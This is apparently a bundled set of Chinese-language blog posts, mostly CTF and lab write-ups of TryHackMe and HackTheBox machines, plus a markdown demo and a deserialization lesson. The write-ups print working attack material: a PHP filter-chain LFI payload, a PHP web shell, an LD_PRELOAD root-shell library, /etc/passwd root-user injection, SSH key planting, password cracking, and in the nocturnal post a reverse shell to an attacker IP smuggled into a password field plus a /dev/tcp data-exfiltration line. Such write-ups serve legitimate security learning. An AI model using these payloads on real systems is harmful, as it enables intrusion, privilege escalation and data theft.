8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp

\`\`\`

![](../assets/img/Pasted%20image%2020241116020944.png)

![](../assets/img/Pasted%20image%2020241116022114.png)

## webshell
![](../assets/img/Pasted%20image%2020241116022126.png)

数据库密码

\`\`\`
www-data@cheesectf:/var/www/html$ grep ";" login.php

$servername = "localhost";
$user = "comte";
$password = "VeryCheesyPassword";
$dbname = "users";
$conn = new mysqli($servername, $user, $password, $dbname);

\`\`\`

\`\`\`
MariaDB [users]> selselect * from users;
select * from users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | comte    | 5b0c2e1b4fe1410e47f26feff7f4fc4c |
+----+----------+----------------------------------+
1 row in set (0.000 sec)

\`\`\`

## userShell

\`\`\`
pwd /home/comte
-rw-rw-rw- 1 comte comte    0 Mar 25  2024 authorized_keys
\`\`\`

可读可写？
在本地机器生成公私钥对
\`\`\`
ssh-keygen -t rsa -f id_rsa -b 4096 -C '' -N ''
\`\`\`

把公钥写道authorized_keys文件

\`\`\`
echo 'contents_of_id_rsa.pub' > /home/comte/.ssh/authorized_keys
\`\`\`

用私钥连接
\`\`\`
ssh comte@cheese.thm -i id_rsa
\`\`\`

## 提权

\`\`\`
comte@cheesectf:~$ sudo -l
User comte may run the following commands on cheesectf:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
comte@cheesectf:~$ id

\`\`\`

\`\`\`
comte@cheesectf:~$ sudo /bin/systemctl start exploit.timer
Failed to start exploit.timer: Unit exploit.timer has a bad unit file setting.
See system logs and 'systemctl status exploit.timer' for details.
\`\`\`

\`\`\`
comte@cheesectf:~$ ls -lah /etc/systemd/system/exploit.timer
-rwxrwxrwx 1 root root 87 Mar 29  2024 /etc/systemd/system/exploit.timer

\`\`\`

可读可写

\`\`\`
comte@cheesectf:/opt$ vim /etc/systemd/system/exploit.timer
comte@cheesectf:/opt$ ls -la
total 8
drwxr-xr-x  2 root root 4096 Mar 29  2024 .
drwxr-xr-x 19 root root 4096 Sep 27  2023 ..
comte@cheesectf:/opt$ ls -la
total 8
drwxr-xr-x  2 root root 4096 Mar 29  2024 .
drwxr-xr-x 19 root root 4096 Sep 27  2023 ..
comte@cheesectf:/opt$ ls -la
total 8
drwxr-xr-x  2 root root 4096 Mar 29  2024 .
drwxr-xr-x 19 root root 4096 Sep 27  2023 ..
comte@cheesectf:/opt$ ls -la
total 8
drwxr-xr-x  2 root root 4096 Mar 29  2024 .
drwxr-xr-x 19 root root 4096 Sep 27  2023 ..
comte@cheesectf:/opt$ sudo /bin/systemctl daemon-reload
comte@cheesectf:/opt$ vim /etc/systemd/system/exploit.timer
comte@cheesectf:/opt$ sudo systemctl restart exploit.timer
comte@cheesectf:/opt$ ls
xxd
comte@cheesectf:/opt$ cd xxd
-bash: cd: xxd: Not a directory
comte@cheesectf:/opt$ ls -al
total 28
drwxr-xr-x  2 root root  4096 Nov 15 19:05 .
drwxr-xr-x 19 root root  4096 Sep 27  2023 ..
-rwsr-sr-x  1 root root 18712 Nov 15 19:05 xxd
comte@cheesectf:/opt$ 

\`\`\`

让我们看看 go awayBins 看看可以用 SUID 集 **xxd** 二进制文件做什么。就在这里，我们可以使用它读取任何文件。由于我们只需要从 **/root/root.txt** 获取 **root.txt** 文件数据。我们可以直接使用它，而无需使用以下命令获得权限 root shell。

![](../assets/img/Pasted%20image%2020241116030714.png)


\`\`\`
comte@cheesectf:/opt$ LFILE=/root/root.txt
comte@cheesectf:/opt$ /opt/xxd "$LFILE" | /opt/xxd -r
      _                           _       _ _  __
  ___| |__   ___  ___  ___  ___  (_)___  | (_)/ _| ___
 / __| '_ \\ / _ \\/ _ \\/ __|/ _ \\ | / __| | | | |_ / _ \\
| (__| | | |  __/  __/\\__ \\  __/ | \\__ \\ | | |  _|  __/
 \\___|_| |_|\\___|\\___||___/\\___| |_|___/ |_|_|_|  \\___|


THM{---}
comte@cheesectf:/opt$ 

\`\`\``,j=`---
title: creative-thm
tags:
  - 靶场
  - THM
  - ssh
  - LD_PRELOAD
categories:
  - 网络安全
---

## 基本信息

| 本机          | 目标机器        |
| ----------- | ----------- |
| 10.17.5.121 | 10.10.28.27 |

## 信息搜集

\`\`\`
Open 10.10.28.27:22
Open 10.10.28.27:80
\`\`\`

写入host
http://creative.thm/

### 子域枚举
\`\`\`
└─$ ffuf -u http://creative.thm -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -H "Host: FUZZ.creative.thm" -fs 178 

beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 316ms]
:: Progress: [5000/5000] :: Job [1/1] :: 111 req/sec :: Duration: [0:00:43] :: Errors: 0 ::

\`\`\`
## 漏洞利用

SSRF?

![](../assets/img/Pasted%20image%2020241116151342.png)

### 思考利用

1. \`file\`协议读取文件
2. 对内部服务进行枚举

### 测试利用
1. 不行
![](../assets/img/Pasted%20image%2020241116152326.png)

2. 枚举内部端口
![](../assets/img/Pasted%20image%2020241116152438.png)

![](../assets/img/Pasted%20image%2020241116152529.png)

文件读取
\`\`\`
saad:x:1000:1000:saad:/home/saad:/bin/bash
\`\`\`
## webshell

![](../assets/img/Pasted%20image%2020241116152724.png)

读取私钥文件

## usershell


\`\`\`
┌──(kali㉿kali)-[~/Documents/thm/creative]
└─$ chmod 600 id_rsa                    
┌──(kali㉿kali)-[~/Documents/thm/creative]
└─$ ssh -i id_rsa saad@beta.creative.thm
Enter passphrase for key 'id_rsa': 
\`\`\`

该死 还需要输入密码才能使用私钥

\`\`\`
ssh2john id_rsa >id_rsa.txt
\`\`\`

密码枚举
\`\`\`
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetness        (id_rsa)     
1g 0:00:00:21 DONE (2024-11-16 02:32) 0.04683g/s 44.96p/s 44.96c/s 44.96C/s xbox360..sandy
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                        
\`\`\`

用该密钥进私钥登录

bash历史
\`\`\`
echo "saad:MyStrongestPasswordYet$4291" > creds.txt

\`\`\`
## rootshell

\`\`\`
saad@m4lware:~$ sudo -l
[sudo] password for saad: 
Matching Defaults entries for saad on m4lware:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,
    env_keep+=LD_PRELOAD

User saad may run the following commands on m4lware:
    (root) /usr/bin/ping

\`\`\`

?? 
\`\`\`
env_keep+=LD_PRELOAD
\`\`\`

这允许我们为运行的命令设置环境变量，就像 .\`LD_PRELOAD\`\`root\`\`sudo\`


环境变量用于指定要在进程的任何其他库之前加载的库。\`LD_PRELOAD\`

我们可以使用它来使我们运行的进程加载恶意库并运行我们的代码。\`root\`\`sudo\`

首先，制作一个恶意的共享库，它将为我们生成一个 shell。

我们将代码放在函数中，以便在加载库时运行它。\`_init()\`

此外，在加载库后取消设置变量以阻止我们运行的其他进程再次加载库并生成另一个 shell。\`LD_PRELOAD\`

\`\`\`
#include <stdlib.h>
void _init() {
	unsetenv("LD_PRELOAD");
	system("/bin/sh");
}
\`\`\`

将其编译到共享库中。

\`\`\`
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
\`\`\`

\`\`\`
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
\`\`\`

\`\`\`bash
saad@m4lware:/tmp$ vim shell.c
saad@m4lware:/tmp$ cat shell.c 
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        system("/bin/sh");
}
saad@m4lware:/tmp$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
saad@m4lware:/tmp$ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
# id
uid=0(root) gid=0(root) groups=0(root)

\`\`\`

## 知识点回顾


SSRF 到内部服务 内部的服务到ssh私钥 私钥的密码爆破 通过bash_history 获取到密码
通过\`LD_PRELOAD\` 进行生成so文件获取到\`rootshell\`
## 总结

`,V=`---
title: thm-dailybugle
tags:
  - 靶场
description:
---
> 通过 SQLi 入侵 Joomla CMS 帐户，练习破解哈希并利用 yum 提升您的权限。

## 靶场概述

难度： hard
描述： sql注入到webshell 到提权的经典案例

---
## 基本信息

| 🚀  | 本地机器信息      | 目标机器信息       |
| --- | ----------- | ------------ |
| IP  | 10.17.5.121 | 10.10.220.38 |
| OS  | kali        |              |

---
## 信息搜集

端口扫描
![](../assets/img/Pasted%20image%2020241124214443.png)

## 攻击向量

![](../assets/img/Pasted%20image%2020241124215418.png)
![](../assets/img/Pasted%20image%2020241124215640.png)


使用joomscan针对目标站点进行扫描，joomscan是一个专门用于扫描Joomla CMS的工具

可以获取指定版本

![](../assets/img/Pasted%20image%2020241124220358.png)
## 漏洞利用

	 Joomla! 3.7.0 - 'com_fields' SQL Injection

\`\`\`txt
sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
\`\`\`

这里提到了 SQLMap 来利用这个漏洞。但是应该有另一种 Python 替代方案，
\`\`\`
https://raw.githubusercontent.com/XiphosResearch/exploits/refs/heads/master/Joomblah/joomblah.py
\`\`\`

如果保存需要报错处修改为utf-8编码
![](../assets/img/Pasted%20image%2020241124220903.png) 
![](../assets/img/Pasted%20image%2020241124221044.png)

登录后考虑进一步利用

![](../assets/img/Pasted%20image%2020241124221148.png)

发现在一个模板出可以进行替换
![](../assets/img/Pasted%20image%2020241124221354.png)

考虑反弹shell

![](../assets/img/Pasted%20image%2020241124221842.png)

![](../assets/img/Pasted%20image%2020241124222026.png)
## 提权

让我们尝试检查此用户的 sudo 权限
没有权限运行 'sudo -l'，所以让我们试着检查 crontab，看看我们是否有东西要升级到 jjameson 用户：
![](../assets/img/Pasted%20image%2020241124222313.png)
![](../assets/img/Pasted%20image%2020241124222451.png)

也什么都没有。所以我们需要进行内部枚举，以便检查一些权限提升向量。在检查了一些目录和文件后，我前往 website 目录检查了配置文件：
![](../assets/img/Pasted%20image%2020241124222650.png)

![](../assets/img/Pasted%20image%2020241124222823.png)
好吧，它们对 root 用户没有用，但也许我们可以将它们与 jjameson 用户一起使用：

![](../assets/img/Pasted%20image%2020241124222915.png)
![](../assets/img/Pasted%20image%2020241124222832.png)

![](../assets/img/Pasted%20image%2020241124223126.png)
gofobins提权
![](../assets/img/Pasted%20image%2020241124223229.png)

![](../assets/img/Pasted%20image%2020241124223726.png)
## 知识点回顾
## 总结

`,Q=`---
title: Enhanced Markdown Features Demo
description: 演示增强的Markdown功能：代码块、提示框和性能优化
date: 2025-01-14
categories: [Demo, Features]
tags: [markdown, demo, features]
---

# 增强功能演示

这篇文章展示了新的Markdown增强功能。

## 代码块增强

### JavaScript 示例

\`\`\`javascript
function fibonacci(n) {
  if (n <= 1) return n;
  return fibonacci(n - 1) + fibonacci(n - 2);
}

// 计算前10个斐波那契数
for (let i = 0; i < 10; i++) {
  console.log(\`fibonacci(\${i}) = \${fibonacci(i)}\`);
}
\`\`\`

### Python 示例

\`\`\`python
def quicksort(arr):
    if len(arr) <= 1:
        return arr
    
    pivot = arr[len(arr) // 2]
    left = [x for x in arr if x < pivot]
    middle = [x for x in arr if x == pivot]
    right = [x for x in arr if x > pivot]
    
    return quicksort(left) + middle + quicksort(right)

# 测试排序
numbers = [3, 6, 8, 10, 1, 2, 1]
sorted_numbers = quicksort(numbers)
print(f"排序结果: {sorted_numbers}")
\`\`\`

### Shell 脚本

\`\`\`bash
#!/bin/bash

# 安全检查脚本
check_security() {
    echo "开始安全检查..."
    
    # 检查开放端口
    netstat -tuln | grep LISTEN
    
    # 检查用户登录
    last -n 10
    
    echo "安全检查完成"
}

check_security
\`\`\`

## 提示框功能

> 这是一个提示框，用于显示重要信息
{: .prompt-tip }

> 这是信息提示框，显示一般信息
{: .prompt-info }

> 这是警告提示框，请注意相关风险
{: .prompt-warning }

> 这是危险提示框，表示严重问题
{: .prompt-danger }

## 混合内容示例

> **重要安全提醒**: 在进行渗透测试前，请确保获得明确的书面授权
{: .prompt-warning }

下面的代码展示了一个简单的端口扫描器：

\`\`\`python
import socket
from datetime import datetime

def scan_port(target, port):
    try:
        # 创建socket对象
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        
        # 尝试连接
        result = sock.connect_ex((target, port))
        sock.close()
        
        return result == 0
    except socket.gaierror:
        return False

# 扫描常见端口
target_host = "127.0.0.1"
common_ports = [22, 80, 443, 3389, 5432, 3306]

print(f"开始扫描 {target_host}")
print(f"时间: {datetime.now()}")
print("-" * 50)

for port in common_ports:
    if scan_port(target_host, port):
        print(f"端口 {port}: 开放")
    else:
        print(f"端口 {port}: 关闭")
\`\`\`

> **免责声明**: 此代码仅用于教育目的，请勿用于未授权的网络扫描
{: .prompt-danger }

## 数学公式支持

内联数学公式：当 $a \\ne 0$ 时，方程 $ax^2 + bx + c = 0$ 的解为：

$$
x = \\frac{-b \\pm \\sqrt{b^2-4ac}}{2a}
$$

> 数学公式使用 KaTeX 渲染，支持 LaTeX 语法
{: .prompt-tip }

## 图片懒加载

![示例图片](../assets/img/image-122.png)

这些图片现在支持懒加载，提升页面性能。

## 总结

新的增强功能包括：

1. **代码块增强**
   - 显示编程语言标签
   - 添加行号
   - 复制功能带状态反馈

2. **提示框支持**
   - 四种类型：tip、info、warning、danger
   - 美观的图标和颜色区分

3. **性能优化**
   - 图片懒加载
   - 优化的代码高亮

> 这些功能让技术文档更加专业和易读！
{: .prompt-tip }
`;const z=`---
title: dogcat
tags:
  - 靶场
  - THM
  - LFI
  - Docker逃逸
description: 我创建了一个网站，您可以在其中查看狗和/或猫的照片！通过 LFI 利用 PHP 应用程序并突破 Docker 容器。
---
> 从本地文件包含到getshell

## 题目概述

**难度**：中
**描述**：我创建了一个网站，您可以在其中查看狗和/或猫的照片！通过 LFI 利用 PHP 应用程序并突破 Docker 容器。 

---
## 基本信息

| 🚀  | 本地机器信息      | 目标机器信息        |
| --- | ----------- | ------------- |
| IP  | 10.17.5.121 | 10.10.200.120 |
| OS  | kali        | linux         |

## 信息搜集

1. 端口扫描
	22,80 
2. 路径探测
	![](../assets/img/Pasted%20image%2020241120235951.png)
3. 服务枚举
		无
## 渗透思路

### 攻击向量
80端口web服务为攻击点
猜测
\`\`\`text
$dir = $_GET["view"] .'.php';
include($dir);
\`\`\`

![](../assets/img/Pasted%20image%2020241121002029.png)
![payload](../assets/img/Pasted%20image%2020241121002212.png)

\`\`\`php
 <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php'; //不传递ext 默认为php文件 读取passwd 需要传递 ext
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
\`\`\`



![](../assets/img/Pasted%20image%2020241121000130.png)
	![](../assets/img/Pasted%20image%2020241121001227.png)

\`\`\`text
<?php system($_GET['cmd']);?>
\`\`\`

user-agent 利用

![](../assets/img/Pasted%20image%2020241121004940.png)

### nday利用
### 信息审计

## 漏洞利用

## getshell

反弹webshell
![](../assets/img/Pasted%20image%2020241121005119.png)
![](../assets/img/Pasted%20image%2020241121005140.png)
## 提权
https://gtfobins.github.io/gtfobins/env/#shell
![](../assets/img/Pasted%20image%2020241121005701.png)
值得注意的是这是个docker 环境

![](../assets/img/Pasted%20image%2020241121010042.png)
![](../assets/img/Pasted%20image%2020241121010217.png)


宿主主机会这些这个bashup.sh 可以尝试把revbash 加到sh文件


![](../assets/img/Pasted%20image%2020241121010737.png)
## 知识点回顾

思路总结下：

利用点：
本地文件包含 \`LFI\`
目录确定 后读取index文件，进行代码审计非php文件需要读取传参ext
读取apache2 /nginx 的访问文件，然后修改useragent 头注入一句话木马,然后反弹shell
容器内提权 sudo env
docker 逃逸 sh脚本反弹shell
## 总结

`,q=`---
title: enterprise
tags:
  - 靶场
description: 
password: lidefei
---
> 

## 靶场概述

难度： hard
描述：您刚刚进入了一个内部网络。您扫描网络，但只有域控制器...

---
## 基本信息

| 🚀  | 本地机器信息      | 目标机器信息 |
| --- | ----------- | ------ |
| IP  | 10.17.5.121 |        |
| OS  | kali        |        |

---
## 信息搜集



## 攻击向量



## 漏洞利用


## 提权


## 知识点回顾
## 总结

`,K=`## 前置条件

1. go
2. gcc mingw
3. fyne
### Windows[#](https://go-circle.cn/fyne-press/v1.0/1-getting-started/introduction.html#windows)

1.下载 [Go](https://golang.org/dl/) 2.安装一个window平台可用的c编译器，一下3个安装任意一个即可

- MSYS2 with MingW-w64 [msys2.org](https://www.msys2.org/)
- TDM-GCC [tdm-gcc](https://jmeubank.github.io/tdm-gcc/download/)
- Cygwin [cygwin.com](https://www.cygwin.com/)
## go的包管理
全局安装》`,X=`---
title: gatekeeper-thm
tags:
  - 靶场
  - THM
  - "#smb"
description: 你能穿过大门穿过火吗？
password: lidefei
---
## 题目描述

> 难度：中等
> 描述：当您准备好释放 Gatekeeper 时，请部署机器。
> 前置条件：

---
## 基本信息

| 🚀  | 本地机器信息      | 目标机器信息 |
| --- | ----------- | ------ |
| IP  | 10.17.5.121 |        |
| OS  | kali        |        |

## 信息搜集

### 端口扫描

smb
1. **SMB（Server Message Block）主要端口**
   - SMB默认使用TCP端口445。这个端口用于在网络上进行文件共享、打印机共享等服务通信。例如，在Windows操作系统的网络共享环境中，当客户端访问服务器上的共享文件夹时，很多情况下是通过TCP 445端口进行数据传输的。
   - SMB早期还使用TCP 139端口。它主要用于NetBIOS会话服务，是旧版本SMB协议（基于NetBIOS over TCP/IP）通信时使用的端口。在一些较老的网络环境或者支持传统SMB通信方式的场景下会用到。不过随着SMB协议的更新和优化，现在大部分SMB通信主要依赖445端口。
\`\`\`
┌──(kali㉿kali)-[~/Documents/thm/gatekeeper]
└─$ smbclient -L 10.10.43.153
Password for [WORKGROUP\\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.43.153 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
\`\`\`


smb信息枚举

#smb
\`\`\`
└─$ enum4linux -a 10.10.43.153                              
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Nov 17 04:26:18 2024

 =========================================( Target Information )=========================================

Target ........... 10.10.43.153
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
\`\`\`


![](../assets/img/Pasted%20image%2020241117173032.png)
### 路径枚举


## 漏洞发现

## 漏洞利用

## webshell

## usershell

## rootshell


## 知识点回顾
## 总结

`,J=`---
title: 如何进行信息搜集
tags:
  - 网络安全
password: lidefei
---
## 前期排查
如何进行资产梳理
外网	搜索引擎 
前期排查
如何进行资产梳理
外网	搜索引擎 
内网	Goby(到处报告)
## 漏洞扫描
只扫描不利用
poc验证
goby
nuclei
fscan


pdfxss
## 漏洞修复

打补丁
弱口令

首先进行信息搜集
通过ip 域名 进行子域名 进收集
进行指纹识别
查看ip开启的服务



mysql 如何get-shell
1. 写webshell
2. outfile
3. 路径 权限
fastjson
shiro反序列化 
xss
票据 传递 免杀
`,Y=`---
title: htb-nocturnal 
tags: [htb,sec]
---

# htb-nocturnal 解题记录

\`$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";\`


$command = "zip -x './backups/*' -r -P
bash -c 'id'
 " . $backupFile . " .  > " . $logFile . " 2>&1 &";


%0abash%09-c%09%22bash+-i+%3e%26+%2fdev%2ftcp%2f10.10.16.20%2f4443+0%3e%261%22%0a

![alt text](../assets/img/htb-nocturnal/image.png)


bash -i >& /dev/tcp/10.10.16.20/4443 0>&1
bash+-i+%3e%26+%2fdev%2ftcp%2f10.10.16.20%2f4443+0%3e%261

bash -i >& /dev/tcp/10.10.16.20/4443 0>&1


bash -i >& /dev/tcp/10.10.16.20/4443 0>&1



ls




password=%0abash%09-c%09%22bash%09-i%09%3e%26%09%2fdev%2ftcp%2f10.10.16.20%2f4443%090%3e%261%22%0a&backup=】


nc -lvp 8888 > received_database.db

cat nocturnal_database.db > /dev/tcp/10.10.10.10/8888



![alt text](../assets/img/htb-nocturnal/image-1.png)

为啥选择这个用户 可以cat /etc/passwd | grep bash 这个就是用户

4|tobias|55c82b1ccd55ab219b3b109b07d5061d

通过爆破或者查询


![alt text](../assets/img/htb-nocturnal/image-2.png)



![alt text](../assets/img/htb-nocturnal/image-3.png)

[EXP](https://github.com/bipbopbup/CVE-2023-46818-python-exploit)

存在密码复用的情况`,Z=`---
title: inferno
tags:
  - 靶场
description:
---
> 

## 靶场概述

难度： medium
描述：现实生活中的机器 + CTF。该机器被设计为现实生活（也许不是？），非常适合刚开始渗透测试的新手

---
## 基本信息

| 🚀  | 本地机器信息      | 目标机器信息        |
| --- | ----------- | ------------- |
| IP  | 10.17.5.121 | 10.10.232.226 |
| OS  | kali        | linux         |

---
## 信息搜集

端口扫描

![](../assets/img/Pasted%20image%2020241201145201.png)


需要登录凭证
	![](../assets/img/Pasted%20image%2020241201145939.png)

\`\`\`
┌──(leo㉿HACK)-[~/SecLab/inferno]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.232.226 http-
get /inferno
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-01 15:01:44
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-get://10.10.232.226:80/inferno
[STATUS] 1341.00 tries/min, 1341 tries in 00:01h, 14343057 to do in 178:16h, 16 active
[STATUS] 1410.00 tries/min, 4230 tries in 00:03h, 14340168 to do in 169:31h, 16 active
\`\`\`
![](../assets/img/Pasted%20image%2020241201151235.png)
![](../assets/img/Pasted%20image%2020241201151339.png)

## 攻击向量

\`\`\`
searchsploit codiad
\`\`\`

## 漏洞利用

![](../assets/img/Pasted%20image%2020241201151944.png)
![](../assets/img/Pasted%20image%2020241201153247.png)
您会注意到有一个 cronjob 每分钟都会让您注销，因此您必须快点。


获取到密钥
![](../assets/img/Pasted%20image%2020241201153800.png)

尝试ssh登录
![](../assets/img/Pasted%20image%2020241201154115.png)



![](../assets/img/Pasted%20image%2020241201154041.png)
让我们利用这一点来生成一个特权用户：

## 提权

\`\`\`
openssl passwd -1 -salt "test" "test"
\`\`\`

\`\`\`
echo 'test:$1$test$pi/xDtU5WFVRqYS6BMU8X/:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
\`\`\`


![](../assets/img/Pasted%20image%2020241201155156.png)
## 知识点回顾
## 总结

`,nn=`---
title: 不安全的反序列化
tags:
  - 靶场
description:
---
> 

## 靶场概述

难度： 
描述：

---
## 基本信息

| 🚀  | 本地机器信息      | 目标机器信息 |
| --- | ----------- | ------ |
| IP  | 10.17.5.121 |        |
| OS  | kali        |        |

---
## 介绍
用户提供的输入一直是漏洞的催化剂，在众多平台和应用程序中构成持续威胁。利用用户输入（从 SQL 注入到跨站点脚本）是保护 Web 应用程序的一个众所周知的挑战。另一个与用户输入相关的不太为人知但同样危险的漏洞是**不安全的反序列化**。  

当应用程序足够信任序列化数据以使用它而不验证其真实性时，就会发生不安全的反序列化漏洞。这种信任可能会导致灾难性的后果，因为攻击者会操纵序列化对象来实现远程代码执行、提升权限或发起拒绝服务攻击。这种类型的漏洞在各种编程环境（如 Java、.NET 和 PHP）中序列化和反序列化复杂数据结构的应用程序中普遍存在，这些环境通常使用序列化进行远程过程调用、会话管理等。  

学习目标

在整个课程中，您将全面了解以下关键概念：

- 序列化和反序列化过程的工作原理  
    
- Web 应用程序的潜在风险
- 开发技术
- 缓解措施

学习先决条件

在开始聊天室之前，建议了解以下主题：

- [网站如何运作](https://tryhackme.com/room/howwebsiteswork)
- [协议和服务器](https://tryhackme.com/room/protocolsandservers)
- [OWASP 公司前 10 名](https://tryhackme.com/room/owasptop10)

连接到本机

您可以通过单击此任务中附带的按钮来启动虚拟机。我们稍后在会议室中使用易受攻击的应用程序来实际执行练习并熟悉各种攻击媒介。请在系统完全启动后等待 1-2 分钟，以让自动脚本成功运行。

让我们开始吧！

## 一些重要概念

在详细讨论不安全反序列化之前，通过一个简单的例子来理解基本概念是至关重要的。  

序列化

想想序列化，就像早上收拾书包一样。你有书、笔记本、午餐盒和水瓶，你需要把它们整理进包里。序列化就像获取不同的信息（如笔记）并将它们放在一起，以便于存储或发送给朋友。
![image.png](https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241203175326.png)

在编程中，序列化是将对象的状态转换为人类可读或二进制格式（或两者的混合）的过程，这些格式可以在需要时存储或传输和重建。在必须在系统的不同部分之间或跨网络传输数据的应用程序（例如基于 Web 的应用程序）中，此功能至关重要。

\`\`\`php
<?php $noteArray = array("title" => "My THM Note", "content" => "Welcome to THM!"); $serialisedNote = serialize($noteArray); // Converting the note into a storable format file_put_contents('note.txt', $serialisedNote); // Saving the serialised note to a file ?>
\`\`\`
以下输出显示文件中的序列化字符串，其中包括注释的结构和内容的详细信息。它的存储方式可以轻松保存或传输。\`note.txt\`

**序列号注释**：\`a:2:{s:5:"title";s:12:"My THM Note";s:7:"content";s:12:"Welcome to THM!";}\`

反序列化

想象一下，你到达学校，需要你今天早上打包的所有东西。反序列化就像你上课时打开书包;您取出每件物品，以便您可以全天使用。当您打开包包去拿书和午餐时，反序列化会获取打包的数据并将其转换回您可以使用的数据。反序列化是将格式化数据转换回对象的过程。它对于从文件、数据库或跨网络检索数据，将其恢复到其原始状态以供应用程序使用至关重要。


按照我们前面的例子，以下是如何在 PHP 中反序列化 note 数据：  

\`\`\`php
<?php
$serialisedNote = file_get_contents('note.txt');  // Reading the serialised note from the file
$noteArray = unserialize($serialisedNote);  // Converting the serialised string back into a PHP array
echo "Title: " . $noteArray['title'] . "<br>";
echo "Content: " . $noteArray['content'];
?>
\`\`\`

此代码从文件中读取序列化的注释并将其转换回数组，从而有效地重建原始注释。讨论序列化还需要进行有关安全性的对话。就像您不希望有人篡改您的书包一样，不安全的反序列化可能会导致软件应用程序出现重大安全漏洞。攻击者可能会更改序列化对象以执行未经授权的操作或窃取数据。

涉及序列化漏洞的特定事件

让我们讨论一下序列化漏洞在网络安全漏洞或攻击中发挥关键作用的具体事件，强调安全序列化实践的重要性。这些示例说明了攻击者如何利用序列化缺陷来实现远程代码执行、数据泄露等。

**Log4j 漏洞 CVE-2021-44228**  

- **事件**：[Log4j 漏洞](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)或 Log4Shell 是在 Apache Log4j 2 库（Java 应用程序中广泛使用的日志记录库）中发现的一个严重安全漏洞。该漏洞允许远程攻击者通过利用库的不安全反序列化功能在受影响的系统上执行任意代码。如果您想了解有关此漏洞的更多信息，请查看 [Solar 利用 log4j](https://tryhackme.com/r/room/solar) 房间。
- **冲击：** 该漏洞促进了远程代码执行，使攻击者能够在受影响的系统上执行任意命令。这允许攻击者破坏关键基础设施，从而导致未经授权访问敏感数据、服务中断和潜在的供应链攻击。

**WebLogic Server 远程代码执行 CVE-2015-4852**

- **事件**：此漏洞与 [Oracle WebLogic Server](https://www.oracle.com/security-alerts/alert-cve-2015-4852.html) 反序列化数据发送到 T3 协议的方式有关。攻击者可以向服务器发送恶意制作的对象，当反序列化时，会导致远程代码执行。
- **影响**：此漏洞被广泛利用，用于未经授权访问系统、部署勒索软件或窃取数据。它影响了未禁用易受攻击的服务或修补问题的所有 WebLogic Server 版本。

**Jenkins Java 反序列化 CVE-2016-0792**

- **事件**：[Jenkins](https://www.tenable.com/plugins/nessus/89034) 是软件开发中使用的一种常用自动化服务器，它遇到了一个涉及 Java 反序列化的严重漏洞。攻击者可以将构建的序列化有效负载发送到 Jenkins CLI，当反序列化时，该 CLI 可能允许执行任意代码。
- **影响**：这允许攻击者执行 shell 命令，从而可能接管 Jenkins 服务器，该服务器通常可以广泛访问软件开发环境，包括源代码、构建系统和可能的部署环境。
## 序列化格式
